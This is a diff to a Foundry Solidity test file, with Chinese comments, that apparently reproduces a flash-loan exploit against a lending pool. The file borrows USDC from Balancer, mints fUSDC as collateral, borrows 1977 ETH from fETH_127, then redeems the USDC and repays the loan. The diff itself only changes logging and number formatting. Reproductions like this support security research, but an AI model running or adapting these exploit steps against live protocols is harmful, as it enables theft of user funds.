@@ -74,8 +74,6 @@ interface IUnitroller {
 
     function borrowCaps(address) external view returns (uint256);
     
-
-
 }
 
 interface IBalancerVault {
@@ -101,16 +99,18 @@ contract ContractTest is DSTest {
 
     IBalancerVault  vault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
+
     function test() public{
 
         // 前置准备操作1: 查看 fETH_127 中有多少ETH可以借  
-        emit log_named_uint("ETH Balance of fETH_127 before borrowing",address(fETH_127).balance/1e18);
+        emit log_named_uint("\nETH Balance of fETH_127 before borrowing",address(fETH_127).balance/1e18);
 
         // 前置准备操作2: 因为forge的测试地址上本身有很多的ETH 
         // 所以先把他们都转走, 方便查看攻击所得ETH数量
+
         payable(address(0)).transfer(address(this).balance);
 
-        emit log_named_uint("ETH Balance after sending to blackHole",address(this).balance);
+        emit log_named_uint("ETH Balance of me before flashloan",address(this).balance);
 
         // 第一步, 从balancer中通过闪电贷借1500万的USDC
         // 攻击者其实借了1.5亿, 但其实1500万就可以
@@ -122,8 +122,7 @@ contract ContractTest is DSTest {
 
         uint[] memory amounts = new uint[](1);
 
-        amounts[0] =  150000000*10**6;
-
+        amounts[0] =  15*10**13; //150000000*10**6
         vault.flashLoan(address(this), tokens, amounts, '');
 
     }
@@ -144,7 +143,7 @@ contract ContractTest is DSTest {
         // 查看是否成功借到了1500万的USDC
 
         uint usdc_balance = usdc.balanceOf(address(this));
-        emit log_named_uint("Borrow USDC from balancer",usdc_balance);
+        emit log_named_uint("\nBorrow USDC from balancer",usdc_balance);
 
         // 第二步, 调用fusdc_127的mint函数, 
         // 完成usdc的质押操作
@@ -153,11 +152,11 @@ contract ContractTest is DSTest {
 
         fusdc_127.accrueInterest();
 
-        fusdc_127.mint(15000000000000);
+        fusdc_127.mint(15*10**12); //15000000000000
 
         uint fETH_Balance = fETH_127.balanceOf(address(this));
 
-        emit log_named_uint("fETH Balance after minting",fETH_Balance);
+        emit log_named_uint("fETH Balance of me after minting",fETH_Balance);
 
         usdc_balance = usdc.balanceOf(address(this));
 
@@ -175,7 +174,7 @@ contract ContractTest is DSTest {
 
         fETH_127.borrow(1977 ether);
 
-        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing",address(fETH_127).balance/1e18);
+        emit log_named_uint("\nETH Balance of fETH_127_Pool after borrowing",address(fETH_127).balance/1e18);
 
         emit log_named_uint("ETH Balance of me after borrowing",address(this).balance/1e18);
 
@@ -183,11 +182,11 @@ contract ContractTest is DSTest {
 
         fusdc_127.approve(address(fusdc_127), type(uint256).max);
 
-        fusdc_127.redeemUnderlying(15000000000000);
+        fusdc_127.redeemUnderlying(15*10**12);
 
         usdc_balance = usdc.balanceOf(address(this));
 
-        emit log_named_uint("USDC balance after borrowing",usdc_balance);
+        emit log_named_uint("\nUSDC balance after borrowing",usdc_balance);
 
         // 第五步, 把1500万的USDC还给balancer
 
